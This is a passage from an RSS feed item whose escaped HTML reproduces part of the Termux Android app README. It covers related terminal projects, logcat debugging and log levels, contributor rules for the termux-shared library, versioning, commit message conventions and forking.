  &lt;li&gt; &lt;p&gt;hterm: JavaScript terminal implementation from Chromium. &lt;a href="https://github.com/chromium/hterm"&gt;Source&lt;/a&gt;, including &lt;a href="https://github.com/chromium/hterm/raw/master/js/hterm_vt_tests.js"&gt;tests&lt;/a&gt;, and &lt;a href="https://groups.google.com/a/chromium.org/forum/#!forum/chromium-hterm"&gt;Google group&lt;/a&gt;.&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;xterm: The grandfather of terminal emulators. &lt;a href="https://invisible-island.net/datafiles/release/xterm.tar.gz"&gt;Source&lt;/a&gt;.&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Connectbot: Android SSH client. &lt;a href="https://github.com/connectbot/connectbot"&gt;Source&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Android Terminal Emulator: Android terminal app which Termux terminal handling is based on. Inactive. &lt;a href="https://github.com/jackpal/Android-Terminal-Emulator"&gt;Source&lt;/a&gt;.&lt;/p&gt; &lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;h2&gt;&lt;/h2&gt; 
&lt;h3&gt;Debugging&lt;/h3&gt; 
&lt;p&gt;You can help debug problems of the &lt;code&gt;Termux&lt;/code&gt; app and its plugins by setting appropriate &lt;code&gt;logcat&lt;/code&gt; &lt;code&gt;Log Level&lt;/code&gt; in &lt;code&gt;Termux&lt;/code&gt; app settings -&amp;gt; &lt;code&gt;&amp;lt;APP_NAME&amp;gt;&lt;/code&gt; -&amp;gt; &lt;code&gt;Debugging&lt;/code&gt; -&amp;gt; &lt;code&gt;Log Level&lt;/code&gt; (Requires &lt;code&gt;Termux&lt;/code&gt; app version &lt;code&gt;&amp;gt;= 0.118.0&lt;/code&gt;). The &lt;code&gt;Log Level&lt;/code&gt; defaults to &lt;code&gt;Normal&lt;/code&gt; and log level &lt;code&gt;Verbose&lt;/code&gt; currently logs additional information. Its best to revert log level to &lt;code&gt;Normal&lt;/code&gt; after you have finished debugging since private data may otherwise be passed to &lt;code&gt;logcat&lt;/code&gt; during normal operation and moreover, additional logging increases execution time.&lt;/p&gt; 
&lt;p&gt;The plugin apps &lt;strong&gt;do not execute the commands themselves&lt;/strong&gt; but send execution intents to &lt;code&gt;Termux&lt;/code&gt; app, which has its own log level which can be set in &lt;code&gt;Termux&lt;/code&gt; app settings -&amp;gt; &lt;code&gt;Termux&lt;/code&gt; -&amp;gt; &lt;code&gt;Debugging&lt;/code&gt; -&amp;gt; &lt;code&gt;Log Level&lt;/code&gt;. So you must set log level for both &lt;code&gt;Termux&lt;/code&gt; and the respective plugin app settings to get all the info.&lt;/p&gt; 
&lt;p&gt;Once log levels have been set, you can run the &lt;code&gt;logcat&lt;/code&gt; command in &lt;code&gt;Termux&lt;/code&gt; app terminal to view the logs in realtime (&lt;code&gt;Ctrl+c&lt;/code&gt; to stop) or use &lt;code&gt;logcat -d &amp;gt; logcat.txt&lt;/code&gt; to take a dump of the log. You can also view the logs from a PC over &lt;code&gt;ADB&lt;/code&gt;. For more information, check official android &lt;code&gt;logcat&lt;/code&gt; guide &lt;a href="https://developer.android.com/studio/command-line/logcat"&gt;here&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;Moreover, users can generate termux files &lt;code&gt;stat&lt;/code&gt; info and &lt;code&gt;logcat&lt;/code&gt; dump automatically too with terminal's long hold options menu &lt;code&gt;More&lt;/code&gt; -&amp;gt; &lt;code&gt;Report Issue&lt;/code&gt; option and selecting &lt;code&gt;YES&lt;/code&gt; in the prompt shown to add debug info. This can be helpful for reporting and debugging other issues. If the report generated is too large, then &lt;code&gt;Save To File&lt;/code&gt; option in context menu (3 dots on top right) of &lt;code&gt;ReportActivity&lt;/code&gt; can be used and the file viewed/shared instead.&lt;/p&gt; 
&lt;p&gt;Users must post complete report (optionally without sensitive info) when reporting issues. Issues opened with &lt;strong&gt;(partial) screenshots of error reports&lt;/strong&gt; instead of text will likely be automatically closed/deleted.&lt;/p&gt; 
&lt;h5&gt;Log Levels&lt;/h5&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;Off&lt;/code&gt; - Log nothing.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;Normal&lt;/code&gt; - Start logging error, warn and info messages and stacktraces.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;Debug&lt;/code&gt; - Start logging debug messages.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;Verbose&lt;/code&gt; - Start logging verbose messages.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;&lt;/h2&gt; 
&lt;h2&gt;For Maintainers and Contributors&lt;/h2&gt; 
&lt;p&gt;The &lt;a href="https://raw.githubusercontent.com/termux/termux-app/master/termux-shared"&gt;termux-shared&lt;/a&gt; library was added in &lt;a href="https://github.com/termux/termux-app/releases/tag/v0.109"&gt;&lt;code&gt;v0.109&lt;/code&gt;&lt;/a&gt;. It defines shared constants and utils of the Termux app and its plugins. It was created to allow for the removal of all hardcoded paths in the Termux app. Some of the termux plugins are using this as well and rest will in future. If you are contributing code that is using a constant or a util that may be shared, then define it in &lt;code&gt;termux-shared&lt;/code&gt; library if it currently doesn't exist and reference it from there. Update the relevant changelogs as well. Pull requests using hardcoded values &lt;strong&gt;will/should not&lt;/strong&gt; be accepted. Termux app and plugin specific classes must be added under &lt;code&gt;com.termux.shared.termux&lt;/code&gt; package and general classes outside it. The &lt;a href="https://raw.githubusercontent.com/termux/termux-app/master/termux-shared/LICENSE.md"&gt;&lt;code&gt;termux-shared&lt;/code&gt; &lt;code&gt;LICENSE&lt;/code&gt;&lt;/a&gt; must also be checked and updated if necessary when contributing code. The licenses of any external library or code must be honoured.&lt;/p&gt; 
&lt;p&gt;The main Termux constants are defined by &lt;a href="https://github.com/termux/termux-app/raw/master/termux-shared/src/main/java/com/termux/shared/termux/TermuxConstants.java"&gt;&lt;code&gt;TermuxConstants&lt;/code&gt;&lt;/a&gt; class. It also contains information on how to fork Termux or build it with your own package name. Changing the package name will require building the bootstrap zip packages and other packages with the new &lt;code&gt;$PREFIX&lt;/code&gt;, check &lt;a href="https://github.com/termux/termux-packages/wiki/Building-packages"&gt;Building Packages&lt;/a&gt; for more info.&lt;/p&gt; 
&lt;p&gt;Check &lt;a href="https://github.com/termux/termux-app/wiki/Termux-Libraries"&gt;Termux Libraries&lt;/a&gt; for how to import termux libraries in plugin apps and &lt;a href="https://github.com/termux/termux-app/wiki/Termux-Libraries#forking-and-local-development"&gt;Forking and Local Development&lt;/a&gt; for how to update termux libraries for plugins.&lt;/p&gt; 
&lt;p&gt;The &lt;code&gt;versionName&lt;/code&gt; in &lt;code&gt;build.gradle&lt;/code&gt; files of Termux and its plugin apps must follow the &lt;a href="https://semver.org/spec/v2.0.0.html"&gt;semantic version &lt;code&gt;2.0.0&lt;/code&gt; spec&lt;/a&gt; in the format &lt;code&gt;major.minor.patch(-prerelease)(+buildmetadata)&lt;/code&gt;. When bumping &lt;code&gt;versionName&lt;/code&gt; in &lt;code&gt;build.gradle&lt;/code&gt; files and when creating a tag for new releases on GitHub, make sure to include the patch number as well, like &lt;code&gt;v0.1.0&lt;/code&gt; instead of just &lt;code&gt;v0.1&lt;/code&gt;. The &lt;code&gt;build.gradle&lt;/code&gt; files and &lt;code&gt;attach_debug_apks_to_release&lt;/code&gt; workflow validates the version as well and the build/attachment will fail if &lt;code&gt;versionName&lt;/code&gt; does not follow the spec.&lt;/p&gt; 
&lt;h3&gt;Commit Messages Guidelines&lt;/h3&gt; 
&lt;p&gt;Commit messages &lt;strong&gt;must&lt;/strong&gt; use the &lt;a href="https://www.conventionalcommits.org"&gt;Conventional Commits&lt;/a&gt; spec so that chagelogs as per the &lt;a href="https://github.com/olivierlacan/keep-a-changelog"&gt;Keep a Changelog&lt;/a&gt; spec can automatically be generated by the &lt;a href="https://github.com/termux/create-conventional-changelog"&gt;&lt;code&gt;create-conventional-changelog&lt;/code&gt;&lt;/a&gt; script, check its repo for further details on the spec. &lt;strong&gt;The first letter for &lt;code&gt;type&lt;/code&gt; and &lt;code&gt;description&lt;/code&gt; must be capital and description should be in the present tense.&lt;/strong&gt; The space after the colon &lt;code&gt;:&lt;/code&gt; is necessary. For a breaking change, add an exclamation mark &lt;code&gt;!&lt;/code&gt; before the colon &lt;code&gt;:&lt;/code&gt;, so that it is highlighted in the chagelog automatically.&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;&amp;lt;type&amp;gt;[optional scope]: &amp;lt;description&amp;gt;

[optional body]

[optional footer(s)]
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Only the &lt;code&gt;types&lt;/code&gt; listed below must be used exactly as they are used in the changelog headings.&lt;/strong&gt; For example, &lt;code&gt;Added: Add foo&lt;/code&gt;, &lt;code&gt;Added|Fixed: Add foo and fix bar&lt;/code&gt;, &lt;code&gt;Changed!: Change baz as a breaking change&lt;/code&gt;, etc. You can optionally add a scope as well, like &lt;code&gt;Fixed(terminal): Fix some bug&lt;/code&gt;. &lt;strong&gt;Do not use anything else as type, like &lt;code&gt;add&lt;/code&gt; instead of &lt;code&gt;Added&lt;/code&gt;, etc.&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Added&lt;/strong&gt; for new features.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Changed&lt;/strong&gt; for changes in existing functionality.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Deprecated&lt;/strong&gt; for soon-to-be removed features.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Removed&lt;/strong&gt; for now removed features.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Fixed&lt;/strong&gt; for any bug fixes.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Security&lt;/strong&gt; in case of vulnerabilities.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;&lt;/h2&gt; 
&lt;h2&gt;Forking&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;Check &lt;a href="https://github.com/termux/termux-app/raw/master/termux-shared/src/main/java/com/termux/shared/termux/TermuxConstants.java"&gt;&lt;code&gt;TermuxConstants&lt;/code&gt;&lt;/a&gt; javadocs for instructions on what changes to make in the app to change package name.&lt;/li&gt; 
 &lt;li&gt;You also need to recompile bootstrap zip for the new package name. Check &lt;a href="https://github.com/termux/termux-packages/wiki/For-maintainers#build-bootstrap-archives"&gt;building bootstrap&lt;/a&gt;, &lt;a href="https://github.com/termux/termux-app/issues/1983"&gt;here&lt;/a&gt; and &lt;a href="https://github.com/termux/termux-app/issues/2081#issuecomment-865280111"&gt;here&lt;/a&gt;.&lt;/li&gt; 
 &lt;li&gt;Currently, not all plugins use &lt;code&gt;TermuxConstants&lt;/code&gt; from &lt;code&gt;termux-shared&lt;/code&gt; library and have hardcoded &lt;code&gt;com.termux&lt;/code&gt; values and will need to be manually patched.&lt;/li&gt; 
 &lt;li&gt;If forking termux plugins, check &lt;a href="https://github.com/termux/termux-app/wiki/Termux-Libraries#forking-and-local-development"&gt;Forking and Local Development&lt;/a&gt; for info on how to use termux libraries for plugins.&lt;/li&gt; 
&lt;/ul&gt;</description>
    </item>
    
  </channel>
</rss>